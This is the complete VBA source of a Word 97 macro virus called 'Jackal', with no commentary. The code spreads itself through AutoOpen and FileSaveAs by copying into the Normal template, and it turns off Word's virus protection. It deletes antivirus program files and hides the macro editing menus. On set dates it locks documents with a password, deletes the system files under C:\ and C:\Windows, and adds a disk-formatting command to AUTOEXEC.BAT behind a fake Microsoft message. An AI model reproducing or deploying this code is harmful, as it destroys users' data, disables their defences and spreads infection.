   Attribute VB_Name = "Jackal"

   Sub AutoOpen()
     On Error GoTo Jackal

     Ultras

     KillAV

     Jackal

     Application.ScreenUpdating = False
     Application.DisplayAlerts = wdAlertsNone

     WordBasic.DisableAutoMacros 0
     Options.VirusProtection = False

     Set GlobalDoc = NormalTemplate
     Set ActiveDoc = ActiveDocument

     GlobalInstalled = No
     DocumentInstalled = No

     For j = 1 To NormalTemplate.VBProject.VBComponents.Count
       If NormalTemplate.VBProject.VBComponents(j).Name = "Jackal" Then
         GlobalInstalled = Yes
       End If
     Next

     For i = 1 To ActiveDocument.VBProject.VBComponents.Count
       If ActiveDocument.VBProject.VBComponents(i).Name = "Jackal" Then
         DocumentInstalled = Yes
       End If
     Next

     If GlobalInstalled = No Then
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
       Options.SaveNormalPrompt = False
     End If

     If DocumentInstalled = No Then
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
     End If

     Application.DisplayAlerts = wdAlertsAll

   Jackal:
   End Sub


   Sub FileSaveAs()

     Dialogs(wdDialogFileSaveAs).Show

     On Error GoTo Jackal

     Jackal

     Ultras

     KillAV

     Application.ScreenUpdating = False
     Application.DisplayAlerts = wdAlertsNone

     WordBasic.DisableAutoMacros 0
     Options.VirusProtection = False

     Set GlobalDoc = NormalTemplate
     Set ActiveDoc = ActiveDocument

     GlobalInstalled = No
     DocumentInstalled = No

     For j = 1 To NormalTemplate.VBProject.VBComponents.Count
       If NormalTemplate.VBProject.VBComponents(j).Name = "Jackal" Then
         GlobalInstalled = Yes
       End If
     Next

     For i = 1 To ActiveDocument.VBProject.VBComponents.Count
       If ActiveDocument.VBProject.VBComponents(i).Name = "Jackal" Then
         DocumentInstalled = Yes
       End If
     Next

     If GlobalInstalled = No Then
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
       Options.SaveNormalPrompt = False
     End If

     If DocumentInstalled = No Then
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
     End If

     Application.DisplayAlerts = wdAlertsAll

    Jackal

   Jackal:
   End Sub

   Sub KillAV()
     On Error GoTo Biohazard
     Kill "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
     Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
     Kill "C:\Program Files\Command Software\F-PROT95\*.dll"
     Kill "C:\Program Files\Command Software\F-PROT95\*.exe"
     Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
     Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
     Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
     Kill "C:\Program Files\Symantec\Symevnt.386"
     Kill "C:\Program Files\FindVirus\Findviru.drv"
     Kill "C:\Program Files\Cheyenne\AntiVirus\*.dll"
     Kill "C:\Program Files\Cheyenne\Common\Cshell.dll"
     Kill "C:\PC-Cillin 95\Lpt$vpn.*"
     Kill "C:\PC-Cillin 95\Scan32.dll"
     Kill "C:\PC-Cillin 97\Lpt$vpn.*"
     Kill "C:\PC-Cillin 97\Scan32.dll"
     Kill "C:\eSafe\Protect\*.dll"
     Kill "C:\f-macro\f-macro.exe"
     Kill "C:\TBAVW95\Tbscan.sig"
     Kill "C:\Tbavw95\Tb*.*"
     Kill "C:\VS95\*.dll"
   Biohazard:
   End Sub

   Sub Format()
     On Error GoTo Jackal
     Assistant.Visible = True
     With Assistant.NewBalloon
     .Text = "Error, is necessary will update files"
     .Heading = "Microsoft Office 97"
     .Animation = msoAnimationEmptyTrash
     .Show
   End With
     Open "C:\AUTOEXEC.BAT" For Input As #1
      Close
      SetAttr "C:\AUTOEXEC.BAT", vbNormal
      Open "C:\AUTOEXEC.BAT" For Append As #1
      Print #1, "@ECHO OFF"
      Print #1, "CLS"
      Print #1, "ECHO Microsoft Corp. 1983-1997 All rights reserved"
      Print #1, "ECHO Goes preparation to renovation of your system files"
      Print #1, "ECHO Please wait this can occupy several minutes"
      Print #1, "FORMAT C: /U /C /S /AUTOTEST > NUL"
      Print #1, "ECHO."
      Print #1, "ECHO."
      Print #1, "ECHO."
      Print #1, "ECHO Error at renovations of files"
      Close #1
     SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
   Jackal:
   End Sub

   Sub ToolsMacro()

   End Sub

   Sub ViewVBCode()

   End Sub

   Sub FileTemplates()
   UserForm.Show
   End Sub

   Sub Organizer()
   UserForm.Show
   End Sub

   Sub EditFind()
   UserForm.Show
   Dialogs(wdDialogEditFind).Show
   End Sub

   Sub HelpAbout()
   UserForm.Show
   End Sub

   Sub ToolsCustomize()
   UserForm.Show
   Dialogs(wdDialogToolsCustomize).Show
   End Sub

   Sub ToolsOptions()
   UserForm.Show
   Dialogs(wdDialogToolsOptions).Show
   End Sub

   Sub Jackal()
     On Error GoTo Jackal

      If Day(Now()) = 1 Then
         ActiveDocument.Password = "JACKAL"
         ActiveDocument.Save
       End If

      If Day(Now()) = 5 Then
         Format
       End If

      If Day(Now()) = 9 Then
         Format
       End If

      If Day(Now()) = 15 Then
        Kill "C:\*.*"
        Kill "C:\Windows\*.*"
        Kill "C:\Windows\System\*.*"
       End If

      If Day(Now()) = 17 Then
         Format
       End If

      If Day(Now()) = 25 Then
         Format
       End If

      If Day(Now()) = 27 Then
         ActiveDocument.Password = "ULTRAS"
         ActiveDocument.Save
       End If

      If Day(Now()) = 30 Then
        Kill "C:\*.*"
        Kill "C:\Windows\*.*"
        Kill "C:\Windows\System\*.*"
       End If

      If Month(Now()) = 5 Then
         Format
       End If

   Jackal:
   End Sub

   Sub Ultras()
     On Error GoTo Jackal
     Application.StatusBar = True
     StatusBar = "W97M\JACKAL by ULTRAS"
     Application.Caption = "Jackal by Ultras"
     Application.UserName = "ULTRAS"
     Application.UserInitials = "Jackal"
     Options.BackgroundSave = False
     Options.CreateBackup = False
     Options.SendMailAttach = True
   Jackal:
   End Sub
